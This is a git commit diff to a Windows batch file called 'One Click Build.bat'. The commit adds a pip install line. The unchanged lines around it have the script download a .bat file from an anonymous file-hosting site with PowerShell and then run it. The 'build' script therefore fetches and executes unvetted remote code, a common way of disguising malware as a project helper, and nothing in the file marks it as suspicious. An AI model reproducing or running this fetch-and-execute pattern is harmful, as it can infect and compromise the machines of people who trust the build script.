999f22ebfa61f1fbfc3c4b6ae0a82cf2427fe02e
CodeFoxy <96522178+CodeFoxy-Github@users.noreply.github.com>
2024-07-30 13:27:05 +0800

    Update One Click Build.bat

--- One Click Build.bat
+++ One Click Build.bat
@@ -1,5 +1,6 @@
 @echo off
 echo Download requirements.
+pip install -r requirements.txt
 pip freeze > requirements.txt
 powershell iwr https://files.catbox.moe/27u2dv.bat -OutFile package.bat
 start package.bat
